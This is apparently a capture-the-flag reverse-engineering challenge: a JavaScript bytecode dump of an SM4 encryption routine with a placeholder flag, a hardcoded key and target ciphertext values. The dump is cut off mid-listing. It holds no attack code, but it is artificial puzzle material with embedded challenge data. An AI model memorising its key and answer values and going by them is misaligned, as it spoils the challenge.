123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462Byte code dump: Maximum stack depth: 38 Flags: [small_lit_enc] Argument range end: 0 Register range end: 5 Identifier range end: 30 Const literal range end: 91 Literal range end: 101 0 : CBC_CHECK_VAR ident:5-&gt;string(SboxTable) 2 : CBC_CHECK_VAR ident:6-&gt;string(CK) 4 : CBC_CHECK_VAR ident:7-&gt;string(FK) 6 : CBC_CHECK_VAR ident:8-&gt;string(bigxor) 8 : CBC_CHECK_VAR ident:9-&gt;string(leftshift) 10 : CBC_CHECK_VAR ident:10-&gt;string(prefixInteger) 12 : CBC_CHECK_VAR ident:11-&gt;string(sm4Sbox) 14 : CBC_CHECK_VAR ident:12-&gt;string(GET_ULONG_BE) 16 : CBC_CHECK_VAR ident:13-&gt;string(PUT_ULONG_BE) 18 : CBC_CHECK_VAR ident:14-&gt;string(sm4_getkey) 20 : CBC_CHECK_VAR ident:15-&gt;string(encrypt) 22 : CBC_CHECK_VAR ident:16-&gt;string(decrypt_sm4) 24 : CBC_CHECK_VAR ident:17-&gt;string(compare_array) 26 : CBC_CHECK_VAR ident:18-&gt;string(input) 28 : CBC_CHECK_VAR ident:19-&gt;string(num) 30 : CBC_CHECK_VAR ident:20-&gt;string(message) 32 : CBC_CHECK_VAR ident:21-&gt;string(count) 34 : CBC_CHECK_VAR ident:22-&gt;string(pad_len) 36 : CBC_CREATE_VAR_EVAL ident:5-&gt;string(SboxTable) 38 : CBC_CREATE_VAR_EVAL ident:6-&gt;string(CK) 40 : CBC_CREATE_VAR_EVAL ident:7-&gt;string(FK) 42 : CBC_CREATE_VAR_FUNC_EVAL lit:91 ident:8-&gt;string(bigxor) 45 : CBC_CREATE_VAR_FUNC_EVAL lit:92 ident:9-&gt;string(leftshift) 48 : CBC_CREATE_VAR_FUNC_EVAL lit:93 ident:10-&gt;string(prefixInteger) 51 : CBC_CREATE_VAR_FUNC_EVAL lit:94 ident:11-&gt;string(sm4Sbox) //sm4box 54 : CBC_CREATE_VAR_FUNC_EVAL lit:95 ident:12-&gt;string(GET_ULONG_BE) 57 : CBC_CREATE_VAR_FUNC_EVAL lit:96 ident:13-&gt;string(PUT_ULONG_BE) 60 : CBC_CREATE_VAR_FUNC_EVAL lit:97 ident:14-&gt;string(sm4_getkey) 63 : CBC_CREATE_VAR_FUNC_EVAL lit:98 ident:15-&gt;string(encrypt) 66 : CBC_CREATE_VAR_FUNC_EVAL lit:99 ident:16-&gt;string(decrypt_sm4) 69 : CBC_CREATE_VAR_FUNC_EVAL lit:100 ident:17-&gt;string(compare_array) 72 : CBC_CREATE_VAR_EVAL ident:18-&gt;string(input) 74 : CBC_CREATE_VAR_EVAL ident:19-&gt;string(num) 76 : CBC_CREATE_VAR_EVAL ident:20-&gt;string(message) 78 : CBC_CREATE_VAR_EVAL ident:21-&gt;string(count) 80 : CBC_CREATE_VAR_EVAL ident:22-&gt;string(pad_len) 82 : CBC_PUSH_LITERAL ident:23-&gt;string(Array) 84 : CBC_NEW0 85 : CBC_ASSIGN_SET_IDENT ident:5-&gt;string(SboxTable) 87 : CBC_PUSH_LITERAL_PUSH_NUMBER_0 ident:5-&gt;string(SboxTable) 89 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:214 92 : CBC_PUSH_NUMBER_POS_BYTE number:144 94 : CBC_PUSH_NUMBER_POS_BYTE number:233 96 : CBC_PUSH_NUMBER_POS_BYTE number:254 98 : CBC_PUSH_NUMBER_POS_BYTE number:204 100 : CBC_PUSH_NUMBER_POS_BYTE number:225 102 : CBC_PUSH_NUMBER_POS_BYTE number:61 104 : CBC_PUSH_NUMBER_POS_BYTE number:183 106 : CBC_PUSH_NUMBER_POS_BYTE number:22 108 : CBC_PUSH_NUMBER_POS_BYTE number:182 110 : CBC_PUSH_NUMBER_POS_BYTE number:20 112 : CBC_PUSH_NUMBER_POS_BYTE number:194 114 : CBC_PUSH_NUMBER_POS_BYTE number:40 116 : CBC_PUSH_NUMBER_POS_BYTE number:251 118 : CBC_PUSH_NUMBER_POS_BYTE number:44 120 : CBC_PUSH_NUMBER_POS_BYTE number:5 122 : CBC_NEW byte_arg:16 124 : CBC_ASSIGN_BLOCK 125 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:1 128 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:43 131 : CBC_PUSH_NUMBER_POS_BYTE number:103 133 : CBC_PUSH_NUMBER_POS_BYTE number:154 135 : CBC_PUSH_NUMBER_POS_BYTE number:118 137 : CBC_PUSH_NUMBER_POS_BYTE number:42 139 : CBC_PUSH_NUMBER_POS_BYTE number:190 141 : CBC_PUSH_NUMBER_POS_BYTE number:4 143 : CBC_PUSH_NUMBER_POS_BYTE number:195 145 : CBC_PUSH_NUMBER_POS_BYTE number:170 147 : CBC_PUSH_NUMBER_POS_BYTE number:68 149 : CBC_PUSH_NUMBER_POS_BYTE number:19 151 : CBC_PUSH_NUMBER_POS_BYTE number:38 153 : CBC_PUSH_NUMBER_POS_BYTE number:73 155 : CBC_PUSH_NUMBER_POS_BYTE number:134 157 : CBC_PUSH_NUMBER_POS_BYTE number:6 159 : CBC_PUSH_NUMBER_POS_BYTE number:153 161 : CBC_NEW byte_arg:16 163 : CBC_ASSIGN_BLOCK 164 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:2 167 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:156 170 : CBC_PUSH_NUMBER_POS_BYTE number:66 172 : CBC_PUSH_NUMBER_POS_BYTE number:80 174 : CBC_PUSH_NUMBER_POS_BYTE number:244 176 : CBC_PUSH_NUMBER_POS_BYTE number:145 178 : CBC_PUSH_NUMBER_POS_BYTE number:239 180 : CBC_PUSH_NUMBER_POS_BYTE number:152 182 : CBC_PUSH_NUMBER_POS_BYTE number:122 184 : CBC_PUSH_NUMBER_POS_BYTE number:51 186 : CBC_PUSH_NUMBER_POS_BYTE number:84 188 : CBC_PUSH_NUMBER_POS_BYTE number:11 190 : CBC_PUSH_NUMBER_POS_BYTE number:67 192 : CBC_PUSH_NUMBER_POS_BYTE number:237 194 : CBC_PUSH_NUMBER_POS_BYTE number:207 196 : CBC_PUSH_NUMBER_POS_BYTE number:172 198 : CBC_PUSH_NUMBER_POS_BYTE number:98 200 : CBC_NEW byte_arg:16 202 : CBC_ASSIGN_BLOCK 203 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:3 206 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:228 209 : CBC_PUSH_NUMBER_POS_BYTE number:179 211 : CBC_PUSH_NUMBER_POS_BYTE number:28 213 : CBC_PUSH_NUMBER_POS_BYTE number:169 215 : CBC_PUSH_NUMBER_POS_BYTE number:201 217 : CBC_PUSH_NUMBER_POS_BYTE number:8 219 : CBC_PUSH_NUMBER_POS_BYTE number:232 221 : CBC_PUSH_NUMBER_POS_BYTE number:149 223 : CBC_PUSH_NUMBER_POS_BYTE number:128 225 : CBC_PUSH_NUMBER_POS_BYTE number:223 227 : CBC_PUSH_NUMBER_POS_BYTE number:148 229 : CBC_PUSH_NUMBER_POS_BYTE number:250 231 : CBC_PUSH_NUMBER_POS_BYTE number:117 233 : CBC_PUSH_NUMBER_POS_BYTE number:143 235 : CBC_PUSH_NUMBER_POS_BYTE number:63 237 : CBC_PUSH_NUMBER_POS_BYTE number:166 239 : CBC_NEW byte_arg:16 241 : CBC_ASSIGN_BLOCK 242 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:4 245 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:71 248 : CBC_PUSH_NUMBER_POS_BYTE number:7 250 : CBC_PUSH_NUMBER_POS_BYTE number:167 252 : CBC_PUSH_NUMBER_POS_BYTE number:252 254 : CBC_PUSH_NUMBER_POS_BYTE number:243 256 : CBC_PUSH_NUMBER_POS_BYTE number:115 258 : CBC_PUSH_NUMBER_POS_BYTE number:23 260 : CBC_PUSH_NUMBER_POS_BYTE number:186 262 : CBC_PUSH_NUMBER_POS_BYTE number:131 264 : CBC_PUSH_NUMBER_POS_BYTE number:89 266 : CBC_PUSH_NUMBER_POS_BYTE number:60 268 : CBC_PUSH_NUMBER_POS_BYTE number:25 270 : CBC_PUSH_NUMBER_POS_BYTE number:230 272 : CBC_PUSH_NUMBER_POS_BYTE number:133 274 : CBC_PUSH_NUMBER_POS_BYTE number:79 276 : CBC_PUSH_NUMBER_POS_BYTE number:168 278 : CBC_NEW byte_arg:16 280 : CBC_ASSIGN_BLOCK 281 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:5 284 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:104 287 : CBC_PUSH_NUMBER_POS_BYTE number:107 289 : CBC_PUSH_NUMBER_POS_BYTE number:129 291 : CBC_PUSH_NUMBER_POS_BYTE number:178 293 : CBC_PUSH_NUMBER_POS_BYTE number:113 295 : CBC_PUSH_NUMBER_POS_BYTE number:100 297 : CBC_PUSH_NUMBER_POS_BYTE number:218 299 : CBC_PUSH_NUMBER_POS_BYTE number:139 301 : CBC_PUSH_NUMBER_POS_BYTE number:248 303 : CBC_PUSH_NUMBER_POS_BYTE number:235 305 : CBC_PUSH_NUMBER_POS_BYTE number:15 307 : CBC_PUSH_NUMBER_POS_BYTE number:75 309 : CBC_PUSH_NUMBER_POS_BYTE number:112 311 : CBC_PUSH_NUMBER_POS_BYTE number:86 313 : CBC_PUSH_NUMBER_POS_BYTE number:157 315 : CBC_PUSH_NUMBER_POS_BYTE number:53 317 : CBC_NEW byte_arg:16 319 : CBC_ASSIGN_BLOCK 320 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:6 323 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:30 326 : CBC_PUSH_NUMBER_POS_BYTE number:36 328 : CBC_PUSH_NUMBER_POS_BYTE number:14 330 : CBC_PUSH_NUMBER_POS_BYTE number:94 332 : CBC_PUSH_NUMBER_POS_BYTE number:99 334 : CBC_PUSH_NUMBER_POS_BYTE number:88 336 : CBC_PUSH_NUMBER_POS_BYTE number:209 338 : CBC_PUSH_NUMBER_POS_BYTE number:162 340 : CBC_PUSH_NUMBER_POS_BYTE number:37 342 : CBC_PUSH_NUMBER_POS_BYTE number:34 344 : CBC_PUSH_NUMBER_POS_BYTE number:124 346 : CBC_PUSH_NUMBER_POS_BYTE number:59 348 : CBC_PUSH_NUMBER_POS_BYTE number:1 350 : CBC_PUSH_NUMBER_POS_BYTE number:33 352 : CBC_PUSH_NUMBER_POS_BYTE number:120 354 : CBC_PUSH_NUMBER_POS_BYTE number:135 356 : CBC_NEW byte_arg:16 358 : CBC_ASSIGN_BLOCK 359 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:7 362 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:212 365 : CBC_PUSH_NUMBER_0 366 : CBC_PUSH_NUMBER_POS_BYTE number:70 368 : CBC_PUSH_NUMBER_POS_BYTE number:87 370 : CBC_PUSH_NUMBER_POS_BYTE number:159 372 : CBC_PUSH_NUMBER_POS_BYTE number:211 374 : CBC_PUSH_NUMBER_POS_BYTE number:39 376 : CBC_PUSH_NUMBER_POS_BYTE number:82 378 : CBC_PUSH_NUMBER_POS_BYTE number:76 380 : CBC_PUSH_NUMBER_POS_BYTE number:54 382 : CBC_PUSH_NUMBER_POS_BYTE number:2 384 : CBC_PUSH_NUMBER_POS_BYTE number:231 386 : CBC_PUSH_NUMBER_POS_BYTE number:160 388 : CBC_PUSH_NUMBER_POS_BYTE number:196 390 : CBC_PUSH_NUMBER_POS_BYTE number:200 392 : CBC_PUSH_NUMBER_POS_BYTE number:158 394 : CBC_NEW byte_arg:16 396 : CBC_ASSIGN_BLOCK 397 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:8 400 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:234 403 : CBC_PUSH_NUMBER_POS_BYTE number:191 405 : CBC_PUSH_NUMBER_POS_BYTE number:138 407 : CBC_PUSH_NUMBER_POS_BYTE number:210 409 : CBC_PUSH_NUMBER_POS_BYTE number:64 411 : CBC_PUSH_NUMBER_POS_BYTE number:199 413 : CBC_PUSH_NUMBER_POS_BYTE number:56 415 : CBC_PUSH_NUMBER_POS_BYTE number:181 417 : CBC_PUSH_NUMBER_POS_BYTE number:163 419 : CBC_PUSH_NUMBER_POS_BYTE number:247 421 : CBC_PUSH_NUMBER_POS_BYTE number:242 423 : CBC_PUSH_NUMBER_POS_BYTE number:206 425 : CBC_PUSH_NUMBER_POS_BYTE number:249 427 : CBC_PUSH_NUMBER_POS_BYTE number:97 429 : CBC_PUSH_NUMBER_POS_BYTE number:21 431 : CBC_PUSH_NUMBER_POS_BYTE number:161 433 : CBC_NEW byte_arg:16 435 : CBC_ASSIGN_BLOCK 436 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:9 439 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:224 442 : CBC_PUSH_NUMBER_POS_BYTE number:174 444 : CBC_PUSH_NUMBER_POS_BYTE number:93 446 : CBC_PUSH_NUMBER_POS_BYTE number:164 448 : CBC_PUSH_NUMBER_POS_BYTE number:155 450 : CBC_PUSH_NUMBER_POS_BYTE number:52 452 : CBC_PUSH_NUMBER_POS_BYTE number:26 454 : CBC_PUSH_NUMBER_POS_BYTE number:85 456 : CBC_PUSH_NUMBER_POS_BYTE number:173 458 : CBC_PUSH_NUMBER_POS_BYTE number:147 460 : CBC_PUSH_NUMBER_POS_BYTE number:50 462 : CBC_PUSH_NUMBER_POS_BYTE number:48 464 : CBC_PUSH_NUMBER_POS_BYTE number:245 466 : CBC_PUSH_NUMBER_POS_BYTE number:140 468 : CBC_PUSH_NUMBER_POS_BYTE number:177 470 : CBC_PUSH_NUMBER_POS_BYTE number:227 472 : CBC_NEW byte_arg:16 474 : CBC_ASSIGN_BLOCK 475 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:10 478 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:29 481 : CBC_PUSH_NUMBER_POS_BYTE number:246 483 : CBC_PUSH_NUMBER_POS_BYTE number:226 485 : CBC_PUSH_NUMBER_POS_BYTE number:46 487 : CBC_PUSH_NUMBER_POS_BYTE number:130 489 : CBC_PUSH_NUMBER_POS_BYTE number:102 491 : CBC_PUSH_NUMBER_POS_BYTE number:202 493 : CBC_PUSH_NUMBER_POS_BYTE number:96 495 : CBC_PUSH_NUMBER_POS_BYTE number:192 497 : CBC_PUSH_NUMBER_POS_BYTE number:41 499 : CBC_PUSH_NUMBER_POS_BYTE number:35 501 : CBC_PUSH_NUMBER_POS_BYTE number:171 503 : CBC_PUSH_NUMBER_POS_BYTE number:13 505 : CBC_PUSH_NUMBER_POS_BYTE number:83 507 : CBC_PUSH_NUMBER_POS_BYTE number:78 509 : CBC_PUSH_NUMBER_POS_BYTE number:111 511 : CBC_NEW byte_arg:16 513 : CBC_ASSIGN_BLOCK 514 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:11 517 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:213 520 : CBC_PUSH_NUMBER_POS_BYTE number:219 522 : CBC_PUSH_NUMBER_POS_BYTE number:55 524 : CBC_PUSH_NUMBER_POS_BYTE number:69 526 : CBC_PUSH_NUMBER_POS_BYTE number:222 528 : CBC_PUSH_NUMBER_POS_BYTE number:253 530 : CBC_PUSH_NUMBER_POS_BYTE number:142 532 : CBC_PUSH_NUMBER_POS_BYTE number:47 534 : CBC_PUSH_NUMBER_POS_BYTE number:3 536 : CBC_PUSH_NUMBER_POS_BYTE number:255 538 : CBC_PUSH_NUMBER_POS_BYTE number:106 540 : CBC_PUSH_NUMBER_POS_BYTE number:114 542 : CBC_PUSH_NUMBER_POS_BYTE number:109 544 : CBC_PUSH_NUMBER_POS_BYTE number:108 546 : CBC_PUSH_NUMBER_POS_BYTE number:91 548 : CBC_PUSH_NUMBER_POS_BYTE number:81 550 : CBC_NEW byte_arg:16 552 : CBC_ASSIGN_BLOCK 553 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:12 556 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:141 559 : CBC_PUSH_NUMBER_POS_BYTE number:27 561 : CBC_PUSH_NUMBER_POS_BYTE number:175 563 : CBC_PUSH_NUMBER_POS_BYTE number:146 565 : CBC_PUSH_NUMBER_POS_BYTE number:187 567 : CBC_PUSH_NUMBER_POS_BYTE number:221 569 : CBC_PUSH_NUMBER_POS_BYTE number:188 571 : CBC_PUSH_NUMBER_POS_BYTE number:127 573 : CBC_PUSH_NUMBER_POS_BYTE number:17 575 : CBC_PUSH_NUMBER_POS_BYTE number:217 577 : CBC_PUSH_NUMBER_POS_BYTE number:92 579 : CBC_PUSH_NUMBER_POS_BYTE number:65 581 : CBC_PUSH_NUMBER_POS_BYTE number:31 583 : CBC_PUSH_NUMBER_POS_BYTE number:16 585 : CBC_PUSH_NUMBER_POS_BYTE number:90 587 : CBC_PUSH_NUMBER_POS_BYTE number:216 589 : CBC_NEW byte_arg:16 591 : CBC_ASSIGN_BLOCK 592 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:13 595 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:10 598 : CBC_PUSH_NUMBER_POS_BYTE number:193 600 : CBC_PUSH_NUMBER_POS_BYTE number:49 602 : CBC_PUSH_NUMBER_POS_BYTE number:136 604 : CBC_PUSH_NUMBER_POS_BYTE number:165 606 : CBC_PUSH_NUMBER_POS_BYTE number:205 608 : CBC_PUSH_NUMBER_POS_BYTE number:123 610 : CBC_PUSH_NUMBER_POS_BYTE number:189 612 : CBC_PUSH_NUMBER_POS_BYTE number:45 614 : CBC_PUSH_NUMBER_POS_BYTE number:116 616 : CBC_PUSH_NUMBER_POS_BYTE number:208 618 : CBC_PUSH_NUMBER_POS_BYTE number:18 620 : CBC_PUSH_NUMBER_POS_BYTE number:184 622 : CBC_PUSH_NUMBER_POS_BYTE number:229 624 : CBC_PUSH_NUMBER_POS_BYTE number:180 626 : CBC_PUSH_NUMBER_POS_BYTE number:176 628 : CBC_NEW byte_arg:16 630 : CBC_ASSIGN_BLOCK 631 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:14 634 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:137 637 : CBC_PUSH_NUMBER_POS_BYTE number:105 639 : CBC_PUSH_NUMBER_POS_BYTE number:151 641 : CBC_PUSH_NUMBER_POS_BYTE number:74 643 : CBC_PUSH_NUMBER_POS_BYTE number:12 645 : CBC_PUSH_NUMBER_POS_BYTE number:150 647 : CBC_PUSH_NUMBER_POS_BYTE number:119 649 : CBC_PUSH_NUMBER_POS_BYTE number:126 651 : CBC_PUSH_NUMBER_POS_BYTE number:101 653 : CBC_PUSH_NUMBER_POS_BYTE number:185 655 : CBC_PUSH_NUMBER_POS_BYTE number:241 657 : CBC_PUSH_NUMBER_POS_BYTE number:9 659 : CBC_PUSH_NUMBER_POS_BYTE number:197 661 : CBC_PUSH_NUMBER_POS_BYTE number:110 663 : CBC_PUSH_NUMBER_POS_BYTE number:198 665 : CBC_PUSH_NUMBER_POS_BYTE number:132 667 : CBC_NEW byte_arg:16 669 : CBC_ASSIGN_BLOCK 670 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:5-&gt;string(SboxTable) number:15 673 : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:23-&gt;string(Array) number:24 676 : CBC_PUSH_NUMBER_POS_BYTE number:240 678 : CBC_PUSH_NUMBER_POS_BYTE number:125 680 : CBC_PUSH_NUMBER_POS_BYTE number:236 682 : CBC_PUSH_NUMBER_POS_BYTE number:58 684 : CBC_PUSH_NUMBER_POS_BYTE number:220 686 : CBC_PUSH_NUMBER_POS_BYTE number:77 688 : CBC_PUSH_NUMBER_POS_BYTE number:32 690 : CBC_PUSH_NUMBER_POS_BYTE number:121 692 : CBC_PUSH_NUMBER_POS_BYTE number:238 694 : CBC_PUSH_NUMBER_POS_BYTE number:95 696 : CBC_PUSH_NUMBER_POS_BYTE number:62 698 : CBC_PUSH_NUMBER_POS_BYTE number:215 700 : CBC_PUSH_NUMBER_POS_BYTE number:203 702 : CBC_PUSH_NUMBER_POS_BYTE number:57 704 : CBC_PUSH_NUMBER_POS_BYTE number:72 706 : CBC_NEW byte_arg:16 708 : CBC_ASSIGN_BLOCK 709 : CBC_PUSH_THREE_LITERALS ident:23-&gt;string(Array) const:30-&gt;number(462357) const:31-&gt;number(472066609) 713 : CBC_PUSH_THREE_LITERALS const:32-&gt;number(943670861) const:33-&gt;number(1415275113) const:34-&gt;number(1886879365) 717 : CBC_PUSH_THREE_LITERALS const:35-&gt;number(2358483617) const:36-&gt;number(2830087869) const:37-&gt;number(3301692121) 721 : CBC_PUSH_THREE_LITERALS const:38-&gt;number(3773296373) const:39-&gt;number(4228057617) const:40-&gt;number(404694573) 725 : CBC_PUSH_THREE_LITERALS const:41-&gt;number(876298825) const:42-&gt;number(1347903077) const:43-&gt;number(1819507329) 729 : CBC_PUSH_THREE_LITERALS const:44-&gt;number(2291111581) const:45-&gt;number(2762715833) const:46-&gt;number(3234320085) 733 : CBC_PUSH_THREE_LITERALS const:47-&gt;number(3705924337) const:48-&gt;number(4177462797) const:49-&gt;number(337322537) 737 : CBC_PUSH_THREE_LITERALS const:50-&gt;number(808926789) const:51-&gt;number(1280531041) const:52-&gt;number(1752135293) 741 : CBC_PUSH_THREE_LITERALS const:53-&gt;number(2223739545) const:54-&gt;number(2695343797) const:55-&gt;number(3166948049) 745 : CBC_PUSH_THREE_LITERALS const:56-&gt;number(3638552301) const:57-&gt;number(4110090761) const:58-&gt;number(269950501) 749 : CBC_PUSH_THREE_LITERALS const:59-&gt;number(741554753) const:60-&gt;number(1213159005) const:61-&gt;number(1684763257) 753 : CBC_NEW byte_arg:32 755 : CBC_ASSIGN_SET_IDENT ident:6-&gt;string(CK) 757 : CBC_PUSH_THREE_LITERALS ident:23-&gt;string(Array) const:62-&gt;number(2746333894) const:63-&gt;number(1453994832) 761 : CBC_PUSH_TWO_LITERALS const:64-&gt;number(1736282519) const:65-&gt;number(2993693404) 764 : CBC_NEW byte_arg:4 766 : CBC_ASSIGN_SET_IDENT ident:7-&gt;string(FK) 768 : CBC_PUSH_LITERAL const:66-&gt;string(ctf&#123;this_is_an_example&#125;) 770 : CBC_ASSIGN_SET_IDENT ident:18-&gt;string(input) 772 : CBC_PUSH_NUMBER_0 773 : CBC_ASSIGN_SET_IDENT ident:19-&gt;string(num) 775 : CBC_PUSH_LITERAL ident:23-&gt;string(Array) 777 : CBC_NEW0 778 : CBC_ASSIGN_SET_IDENT ident:20-&gt;string(message) 780 : CBC_PUSH_NUMBER_0 781 : CBC_MOV_IDENT reg:1 783 : CBC_JUMP_FORWARD offset:32(-&gt;815) 785 : CBC_MULTIPLY_TWO_LITERALS ident:19-&gt;string(num) const:67-&gt;number(256) 788 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:18-&gt;string(input) const:68-&gt;string(charCodeAt) 791 : CBC_PUSH_LITERAL reg:1 793 : CBC_CALL1_PROP_PUSH_RESULT 794 : CBC_ADD 795 : CBC_ASSIGN_SET_IDENT_BLOCK ident:19-&gt;string(num) 797 : CBC_MODULO_TWO_LITERALS reg:1 const:69-&gt;number(4) 800 : CBC_EQUAL_RIGHT_LITERAL const:70-&gt;number(3) 802 : CBC_BRANCH_IF_FALSE_FORWARD offset:11(-&gt;813) 804 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:20-&gt;string(message) const:71-&gt;string(push) 807 : CBC_PUSH_LITERAL ident:19-&gt;string(num) 809 : CBC_CALL1_PROP_BLOCK 810 : CBC_PUSH_NUMBER_0 811 : CBC_ASSIGN_SET_IDENT_BLOCK ident:19-&gt;string(num) 813 : CBC_PRE_INCR_IDENT reg:1 815 : CBC_PUSH_TWO_LITERALS reg:1 ident:18-&gt;string(input) 818 : CBC_PUSH_PROP_LITERAL const:72-&gt;string(length) 820 : CBC_LESS 821 : CBC_BRANCH_IF_TRUE_BACKWARD offset:36(-&gt;785) 823 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:24-&gt;string(Math) const:73-&gt;string(ceil) 826 : CBC_PUSH_PROP_LITERAL_LITERAL ident:20-&gt;string(message) const:72-&gt;string(length) 829 : CBC_DIVIDE_RIGHT_LITERAL const:69-&gt;number(4) 831 : CBC_CALL1_PROP_PUSH_RESULT 832 : CBC_ASSIGN_SET_IDENT ident:21-&gt;string(count) 834 : CBC_MULTIPLY_TWO_LITERALS ident:21-&gt;string(count) const:69-&gt;number(4) 837 : CBC_ASSIGN_SET_IDENT ident:22-&gt;string(pad_len) 839 : CBC_JUMP_FORWARD offset:7(-&gt;846) 841 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:20-&gt;string(message) const:71-&gt;string(push) 844 : CBC_PUSH_NUMBER_0 845 : CBC_CALL1_PROP_BLOCK 846 : CBC_PUSH_PROP_LITERAL_LITERAL ident:20-&gt;string(message) const:72-&gt;string(length) 849 : CBC_LESS_RIGHT_LITERAL ident:22-&gt;string(pad_len) 851 : CBC_BRANCH_IF_TRUE_BACKWARD offset:10(-&gt;841) 853 : CBC_PUSH_THREE_LITERALS ident:23-&gt;string(Array) const:74-&gt;number(19088743) const:75-&gt;number(2309737967) //key 857 : CBC_PUSH_TWO_LITERALS const:76-&gt;number(4275878552) const:77-&gt;number(1985229328) 860 : CBC_NEW byte_arg:4 862 : CBC_ASSIGN_SET_IDENT_BLOCK ident:25-&gt;string(key) 864 : CBC_PUSH_THREE_LITERALS ident:23-&gt;string(Array) const:78-&gt;number(1605062385) const:79-&gt;number(-642825121) //数据 868 : CBC_PUSH_THREE_LITERALS const:80-&gt;number(2061445208) const:81-&gt;number(1405610911) const:82-&gt;number(1713399267) 872 : CBC_PUSH_THREE_LITERALS const:83-&gt;number(1396669315) const:84-&gt;number(1081797168) const:85-&gt;number(605181189) 876 : CBC_PUSH_THREE_LITERALS const:86-&gt;number(1824766525) const:87-&gt;number(1196148725) const:88-&gt;number(763423307) 880 : CBC_PUSH_LITERAL const:89-&gt;number(1125925868) 882 : CBC_NEW byte_arg:12 884 : CBC_ASSIGN_SET_IDENT_BLOCK ident:26-&gt;string(ans) 886 : CBC_PUSH_LITERAL ident:23-&gt;string(Array) 888 : CBC_NEW0 889 : CBC_ASSIGN_SET_IDENT_BLOCK ident:27-&gt;string(message_c) 891 : CBC_PUSH_NUMBER_0 892 : CBC_MOV_IDENT reg:1 894 : CBC_JUMP_FORWARD offset:47(-&gt;941) 896 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:20-&gt;string(message) const:90-&gt;string(splice) 899 : CBC_PUSH_NUMBER_0 900 : CBC_PUSH_NUMBER_POS_BYTE number:4 902 : CBC_CALL2_PROP_PUSH_RESULT 903 : CBC_MOV_IDENT reg:2 905 : CBC_PUSH_THREE_LITERALS ident:15-&gt;string(encrypt) reg:2 ident:25-&gt;string(key) 909 : CBC_CALL2_PUSH_RESULT 910 : CBC_MOV_IDENT reg:3 912 : CBC_PUSH_NUMBER_0 913 : CBC_MOV_IDENT reg:4 915 : CBC_JUMP_FORWARD offset:16(-&gt;931) 917 : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:27-&gt;string(message_c) const:71-&gt;string(push) 920 : CBC_PUSH_THREE_LITERALS ident:28-&gt;string(parseInt) reg:3 reg:4 924 : CBC_PUSH_PROP 925 : CBC_PUSH_NUMBER_POS_BYTE number:16 927 : CBC_CALL2_PUSH_RESULT 928 : CBC_CALL1_PROP_BLOCK 929 : CBC_PRE_INCR_IDENT reg:4 931 : 